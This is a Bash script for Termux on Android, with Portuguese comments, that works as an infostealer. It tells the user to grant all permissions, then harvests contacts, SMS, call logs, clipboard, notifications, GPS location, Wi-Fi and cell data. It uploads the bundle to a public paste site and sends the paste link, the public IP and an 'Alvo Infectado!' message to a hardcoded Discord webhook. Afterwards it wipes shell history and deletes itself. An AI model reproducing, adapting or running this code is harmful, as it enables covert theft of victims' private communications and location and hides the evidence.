#!/bin/bash

## Pré-Configurações.

termux-wake-lock
sleep 3
mv .separador $HOME
cd $HOME
DATABASE="https://discord.com/api/webhooks/987366677845012500/8UBH7xmMEThWqePEUcwObKGY7PLXW5UkaRc65rGCaZgtKZZKzthpyLCmnDy1y72VKVof"
sleep 3

## Instalação das Ferramentas e Dependências.

apt update -y
apt full-upgrade -y
apt install termux-api tsu pastebinit curl -y
sleep 3

## Preparação de Ambiente.

termux-api-start
termux-wifi-enable true
echo "Ative seu Wi-Fi e GPS, desative modo de economia de energia, modo avião e economia de dados, e dê todas permissões possíveis ao seu Termux e seu Termux:API."
echo "Simplesmente ative e dê permissões importantes aos seus Apps, e desative funções potencialmente prejudiciais."
sleep 3

## Arquivamento dos Dados.

sudo echo "Superuser binary detected." | grep superuser > .sudo
sleep 3
termux-sensor -a -n 1 > .termux-sensor
sleep 3
termux-nfc -r full > .termux-nfc
sleep 3
termux-usb -l > .termux-usb
sleep 3
termux-camera-info > .termux-camera-info
sleep 3
termux-audio-info > .termux-audio-info
sleep 3
termux-notification-list > .termux-notification-list
sleep 3
termux-clipboard-get > .termux-clipboard-get
sleep 3
termux-contact-list > .termux-contact-list
sleep 3
termux-sms-list > .termux-sms-list
sleep 3
termux-call-log > .termux-call-log
sleep 3
termux-telephony-deviceinfo > .termux-telephony-deviceinfo
sleep 3
termux-telephony-cellinfo > .termux-telephony-cellinfo
sleep 3
termux-wifi-connectioninfo > .termux-wifi-connectioninfo
sleep 3
termux-wifi-scaninfo > .termux-wifi-scaninfo
sleep 3
termux-location > .termux-location
sleep 3
termux-battery-status > .termux-battery-status
sleep 3
termux-tts-engines > .termux-tts-engines
sleep 3
termux-info > .termux-info
sleep 3

## Arquivamento Final dos Dados.

cat .separador .sudo .separador .termux-sensor .separador .termux-nfc .separador .termux-usb .separador .termux-camera-info .separador .termux-audio-info .separador .termux-notification-list .separador .termux-clipboard-get .separador .termux-contact-list .separador .termux-sms-list .separador .termux-call-log .separador .termux-telephony-deviceinfo .separador .termux-telephony-cellinfo .separador .termux-wifi-connectioninfo .separador .termux-wifi-scaninfo .separador .termux-location .separador .termux-battery-status .separador .termux-tts-engines .separador .termux-info > .final-file
MSG=$(echo "Alvo Infectado! Monstrando suas informações vazadas:")
IP=$(curl -s ifconfig.me)
URL=$(pastebinit -b paste.ubuntu.com .final-file)
sleep 3

## Envio para o Servidor.

curl --header "Content-Type: application/json" --data "{\"content\":\"${MSG}\"}" ${DATABASE}
sleep 1
curl --header "Content-Type: application/json" --data "{\"content\":\"${IP}\"}" ${DATABASE}
sleep 1
curl --header "Content-Type: application/json" --data "{\"content\":\"${URL}\"}" ${DATABASE}
sleep 3

## Limpando Rastros.

rm -r .*_history .separador .sudo .termux-sensor .termux-nfc .termux-usb .termux-camera-info .termux-audio-info .termux-notification-list .termux-clipboard-get .termux-contact-list .termux-sms-list .termux-call-log .termux-telephony-deviceinfo .termux-telephony-cellinfo .termux-wifi-connectioninfo .termux-wifi-scaninfo .termux-location .termux-battery-status .termux-tts-engines .termux-info .final-file
echo "Caso você vá guarda esse script em um repositório ou alguma pasta, recomendo que você adicione esse diretório ao comando acima para que ele seja deletado durante o processo de limpeza de rastros."
rm -f $0
sleep 3

## Conclusão Final.

clear
echo "Todo o processo acaba de ser terminado!"
echo "Caso ocorrar qualquer erro, tente repetir suas ações, executar esse script novamente, ou entre em contato conosco pelo GitHub do projeto."
sleep 3
clear
